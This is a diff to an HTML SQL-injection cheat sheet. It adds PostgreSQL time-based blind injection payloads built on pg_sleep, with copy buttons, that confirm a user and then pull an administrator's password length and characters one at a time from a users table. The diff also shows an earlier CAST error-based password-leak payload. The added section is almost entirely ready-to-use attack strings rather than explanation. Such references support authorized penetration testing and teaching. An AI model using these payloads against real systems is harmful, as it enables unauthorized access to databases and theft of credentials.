@@ -43,7 +43,7 @@
 <summary>DEFAULT TEST ATTEMPTS</summary>
 <p><b>DESCRIPTION:</b> List of the normal characters used to test the vulnerability. 
 	
-Getting errors can represent the presence of the vulnerability. [HTTP/2 500 Internal Server Error]
+Getting errors can represent the presence of the vulnerability. <b>[HTTP/2 500 Internal Server Error]</b>
 	
 <b>C1: </b><p id="HDT001"><mark>'</mark></p> 
 <b>C2: </b><p id="HDT002"><mark>''</mark></p>
@@ -343,7 +343,60 @@ valid syntax format.
 
 <b>NOTE: </b> After getting a valid user, you can use the same methodology to leak the password.
 
-<b>SAMPLE: </b><mark>' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</mark></p>
+<b>SAMPLE: </b><mark>' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</mark>
+</p>
+<br>
+<details>
+<summary>TIME DELAY TECHNIQUES</summary>
+<p><b>DESCRIPTION: </b> Techniques used to retrieve data from database, used when there's no visible results, no errors present, etc. However,
+since the query is executed synchronously, it is possible to trigger conditional time delays get results. 
+
+1. IDENTIFY IF TIME DELAY TECHNIQUE CAN BE USED [10 seconds]
+
+<b>C1: </b><p id="TDT01"><mark>'||pg_sleep(10)--</mark></p>
+<b>SAMPLE: </b><mark>'||pg_sleep(10)--</mark>
+
+<b>C2: TRUE </b><p id="TDT02"><mark>';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--</mark></p>
+<b>C3: FALSE </b><p id="TDT03"><mark>';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--</mark></p>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT03')">.C3.</button>
+
+2. RETRIEVE DATA
+
+pre-reqs:
+1. table name
+2. column name
+	
+> CONFIRM USER
+	
+<b>C1: </b><p id="TDT04"><mark>';SELECT CASE WHEN (COLUMN_NAME='VALUE') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM TABLE_NAME--</mark></p>
+<b>SAMPLE: </b><mark>';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT04')">.C1.</button>
+
+> CONFIRM HOW MANY CHARACTERS STORED ON THE COLUMN VALUE FIELD
+
+<b>C2: </b><p id="TDT05"><mark>';SELECT CASE WHEN (COLUMN_NAME='VALUE' AND LENGTH(COLUMN_NAME)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM TABLE_NAME--</mark></p>
+<b>SAMPLE: </b><mark>';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</mark>
+
+Send series of requests modifying the character count,
+
+<b>SAMPLE: </b><mark>';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</mark>
+<b>SAMPLE: </b><mark>';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>18) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</mark>
+	
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT05')">.C2.</button>
+
+> CONFIRM CHARACTER VALUE
+
+<b>C3: </b><p id="TDT06"><mark>';SELECT CASE WHEN (COLUMN_NAME='VALUE' AND SUBSTRING(COLUMN_NAME,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM TABLE_NAME--</mark></p>
+<b>SAMPLE: </b><mark>';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</mark>
+
+<b>NOTE: </b> using substring() functions can help to extract a single character to compare it.
+
+
+	
+</p>
+</details>
 </details>
 </details>	
 </p>
